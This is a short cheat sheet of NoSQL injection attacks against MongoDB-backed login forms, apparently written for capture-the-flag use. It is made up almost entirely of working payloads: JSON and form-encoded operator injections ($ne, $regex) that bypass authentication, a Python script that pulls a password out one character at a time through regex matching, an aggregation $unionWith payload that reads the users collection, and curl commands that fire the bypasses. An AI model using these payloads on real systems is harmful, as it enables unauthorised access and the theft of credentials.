# NoSQL Injection

## Login Bypass

```json
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":"admin","password":{"$ne":null}}
{"username":{"$regex":"^admin$"},"password":{"$ne":null}}
```

Form parser version:

```text
username[$ne]=x&password[$ne]=x
username=admin&password[$ne]=x
username[$regex]=^admin$&password[$ne]=x
```

## Mongo Operators

```json
{"$ne":null}
{"$gt":""}
{"$regex":"^a"}
{"$exists":true}
{"$in":["admin"]}
```

## Regex Extract

```python
import requests
import string

url = "http://TARGET/login"
known = ""
chars = string.ascii_letters + string.digits + "_{}-"

while not known.endswith("}"):
    for c in chars:
        r = requests.post(url, json={
            "username": "admin",
            "password": {"$regex": "^" + known + c}
        })
        if "Welcome" in r.text:
            known += c
            print(known)
            break
```

## Aggregation Injection

```json
{
  "query": [
    {"$match": {"title": null}},
    {"$unionWith": {
      "coll": "users",
      "pipeline": [
        {"$match": {"username": "admin", "password": {"$regex": "^a"}}}
      ]
    }}
  ]
}
```

## Parser Check

```bash
curl http://HOST/login -H 'Content-Type: application/json' -d '{"username":{"$ne":null},"password":{"$ne":null}}'
curl http://HOST/login -H 'Content-Type: application/x-www-form-urlencoded' -d 'username[$ne]=x&password[$ne]=x'
```

